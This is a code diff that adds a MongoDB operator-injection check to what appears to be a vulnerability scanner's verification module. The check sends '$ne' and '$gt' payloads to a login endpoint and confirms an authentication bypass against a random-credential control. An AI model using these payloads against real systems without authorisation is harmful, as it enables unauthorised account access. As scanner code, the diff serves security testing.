@@ -1052,6 +1052,76 @@ def verify_exposure(candidate: Candidate, transport: Transport) -> Verdict:
     return Verdict(REJECTED, "excessive-data-exposure", loc, "no exposed identity+credential records")
 
 
+# --- NoSQL injection (MongoDB operator-injection auth bypass) ----------------------------------
+_NOSQL_TOKEN_RE = re.compile(
+    r'"(?:access[_-]?token|refresh[_-]?token|id[_-]?token|auth[_-]?token|token|jwt|bearer)"'
+    r'\s*:\s*"[^"]{8,}"', re.I)
+_NOSQL_POS_MARKERS = ("dashboard", "logout", "sign out", "log out")
+
+
+def _nosql_auth_artifact(status, body):
+    """A positive AUTHENTICATED-session signal in a response body: a JSON auth token, or a post-auth
+    marker. Status alone is NOT trusted (200-vs-401 is a generic-error / WAF-block trap)."""
+    b = body or ""
+    if _NOSQL_TOKEN_RE.search(b):
+        return True
+    bl = b.lower()
+    return any(m in bl for m in _NOSQL_POS_MARKERS)
+
+
+def verify_nosql_injection(candidate: Candidate, transport: Transport) -> Verdict:
+    """Oracle (slice 1): MongoDB operator-injection AUTH BYPASS at a login endpoint, as a DIFFERENTIAL.
+    Control A posts two random STRINGS (must fail). Payload B posts Mongo operators on the same fields
+    ({"$ne": rand} as a JSON object, then urlencoded [$ne]/[$gt] bracket forms). CONFIRMED iff A shows
+    NO authenticated-session artifact and B DOES (a JSON auth token or post-auth marker absent in A) --
+    so an app that accepts ANY creds (broken auth) or default creds never CONFIRMS. Status alone is never
+    the signal. 429/5xx on either side -> that attempt is not a clean test. Uses a random-string $ne (not
+    $ne:null) -- proves operator interpretation while minimizing account-targeting."""
+    import uuid
+    loc, o = candidate.location, candidate.oracle
+    uf = o.get("user_field", "username")
+    pf = o.get("pass_field", "password")
+    r1, r2 = "grin" + uuid.uuid4().hex[:10], "grin" + uuid.uuid4().hex[:10]
+    agent = transport.by_role.get("anon") or (
+        lambda u, method="GET", json=None, data=None, headers=None: transport.request(
+            method, u, json=json, data=data, headers=headers))
+
+    def post(json=None, data=None, ct=None):
+        h = {"Content-Type": ct} if ct else None
+        return agent(candidate.url, method="POST", json=json, data=data, headers=h)
+
+    attempts = [
+        (dict(json={uf: r1, pf: r2}), dict(json={uf: {"$ne": r1}, pf: {"$ne": r2}})),
+        (dict(data=f"{uf}={r1}&{pf}={r2}", ct="application/x-www-form-urlencoded"),
+         dict(data=f"{uf}[$ne]={r1}&{pf}[$ne]={r2}", ct="application/x-www-form-urlencoded")),
+        (dict(data=f"{uf}={r1}&{pf}={r2}", ct="application/x-www-form-urlencoded"),
+         dict(data=f"{uf}[$gt]=&{pf}[$gt]=", ct="application/x-www-form-urlencoded")),
+    ]
+    sent_any = clean_any = False
+    for control_kw, payload_kw in attempts:
+        try:
+            sa, ba = post(**control_kw)
+            sb, bb = post(**payload_kw)
+        except Exception:
+            continue
+        sent_any = True
+        if sa == 429 or sb == 429 or (sa or 0) >= 500 or (sb or 0) >= 500:
+            continue                                   # throttle/error -> not a clean test, try next form
+        clean_any = True
+        if _nosql_auth_artifact(sa, ba):
+            return Verdict(REJECTED, "nosql-injection", loc,
+                           "the endpoint authenticates random-string credentials (broken/no auth, not NoSQL injection)")
+        if _nosql_auth_artifact(sb, bb):
+            return Verdict(CONFIRMED, "nosql-injection", loc,
+                           "MongoDB operator injection bypassed authentication: a Mongo operator payload "
+                           "produced an authenticated session that random-string credentials did not")
+    if not sent_any:
+        return Verdict(INCONCLUSIVE, "nosql-injection", loc, "could not POST to the login endpoint")
+    if not clean_any:
+        return Verdict(INCONCLUSIVE, "nosql-injection", loc, "login endpoint throttled/errored on every attempt")
+    return Verdict(REJECTED, "nosql-injection", loc, "operator payloads did not bypass authentication")
+
+
 # --- XXE (XML external entity) -----------------------------------------------------------------
 _XXE_TMPL = '<?xml version="1.0"?><!DOCTYPE foo [{dtd}]><foo>{ref}</foo>'
 _XXE_CTYPES = ("application/xml", "text/xml")
@@ -1149,6 +1219,7 @@ _REGISTRY: dict = {
     "reflected-xss": verify_reflected_xss,
     "stored-xss": verify_stored_xss,
     "xxe": verify_xxe,
+    "nosql-injection": verify_nosql_injection,
     "ssrf": verify_ssrf,
     "command-injection": verify_cmd_injection,
     "blind-command-injection": verify_blind_cmd_injection,
